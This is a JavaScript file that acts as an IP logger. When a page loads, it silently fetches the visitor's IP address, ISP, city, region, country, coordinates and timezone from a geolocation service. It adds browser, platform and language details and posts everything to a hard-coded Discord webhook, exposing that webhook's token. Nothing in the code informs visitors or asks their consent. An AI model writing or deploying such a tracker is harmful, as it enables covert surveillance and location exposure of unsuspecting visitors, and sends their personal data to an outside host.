const webhookUrl = 'https://discord.com/api/webhooks/1283585098146381824/bGpKSyhgBtq6NMz0pjYlickWnfes694j3XH9BtlDpR7bnjNNpaf_hnwl9ReNkc_BPyqy';

function detectBrowser() {
  if (window.chrome && /Edg/.test(navigator.userAgent)) {
    return "Edge";
  } else if (window.chrome) {
    return "Chrome";
  } else if (typeof InstallTrigger !== 'undefined') {
    return "Firefox";
  } else if (window.safari !== undefined) {
    return "Safari";
  } else if (!!document.documentMode) {
    return "Internet Explorer";
  } else {
    return "Unknown";
  }
}

function getBrowserVersion() {
  const userAgent = navigator.userAgent;
  let version = "Unknown";

  if (userAgent.includes("Chrome")) {
    version = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/)[1];
  } else if (userAgent.includes("Firefox")) {
    version = userAgent.match(/Firefox\/(\d+\.\d+)/)[1];
  } else if (userAgent.includes("Edg")) {
    version = userAgent.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/)[1];
  } else if (userAgent.includes("Safari")) {
    version = userAgent.match(/Version\/(\d+\.\d+\.\d+)/)[1];
  } else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) {
    version = userAgent.match(/(MSIE |rv:)(\d+\.\d+)/)[2];
  }

  return version;
}

function sendVisitorInfo() {
  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      const { ip, city, region, country_name, latitude, longitude, timezone, org } = data;

      const visitTime = new Date().toLocaleString();
      const browser = detectBrowser();
      const version = getBrowserVersion(); 

 const embed = {
        embeds: [
          {
            title: "Visitor Info",
            color: 3447003,
            description: `**IP Address**: \`${ip}\`\n\n` +
                         `**ISP**: ${org}\n\n` +
                         `**Country**: ${country_name}\n\n` +
                         `**City**: ${city}\n\n` +
                         `**Region**: ${region}\n\n` +
                         `**TimeZone**: ${timezone}\n\n` +
                         `**Visit Time**: ${visitTime}\n\n` +
                         `**Approximate Location**: [Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n\n` +
                         `**Browser**: ${browser} ${version}`,
            footer: {
              text: `Platform: ${navigator.platform}\nLanguage: ${navigator.language}`
            }
          }
        ]
      };
        fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      })
      .then(response => {
        console.log('White');
      })
      .catch(error => console.error('black'));
    })
    .catch(error => console.error('Black error'));
}

window.onload = sendVisitorInfo;